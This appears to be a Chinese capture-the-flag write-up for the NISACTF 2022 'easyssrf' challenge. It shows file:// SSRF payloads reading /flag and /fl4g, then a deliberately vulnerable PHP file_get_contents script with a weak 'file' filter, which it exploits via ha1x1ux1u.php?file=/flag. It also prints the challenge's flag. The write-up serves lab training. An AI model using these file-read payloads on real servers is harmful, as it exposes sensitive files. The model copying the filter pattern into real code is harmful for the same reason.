---
title: '[NISACTF 2022]easyssrf'
date: '2025-05-09T20:49:40+08:00'
weight: 
draft: false
description: '[NISACTF 2022]easyssrf'
---

尝试使用 `file:///flag` 读取 `/flag`，**提示：** 都说了这里看不了flag。。但是可以看看提示文件：/fl4g

![PixPin_2025-05-03_10-01-17](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-03_10-01-17.4g4pcu6c0f.webp)

使用 `file:///fl4g` 读取 `/fl4g`

![PixPin_2025-05-03_10-01-58](https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-03_10-01-58.8hgor8b6ea.webp)

**提示：** file:///fl4g 的快照如下：你应该看看除了index.php，是不是还有个ha1x1ux1u.php

访问 `http://node7.anna.nssctf.cn:21941/`

```php
<?php

highlight_file(__FILE__);
error_reporting(0);

$file = $_GET["file"];
if (stristr($file, "file")){
  die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
```

根据提示 `flag in /flag`，利用任意文件读取漏洞 `ha1x1ux1u.php?file=/flag` 读取 `/flag`

获得 `flag`：`NSSCTF{b18d9345-b262-4732-bda8-67d380c9e2ee}`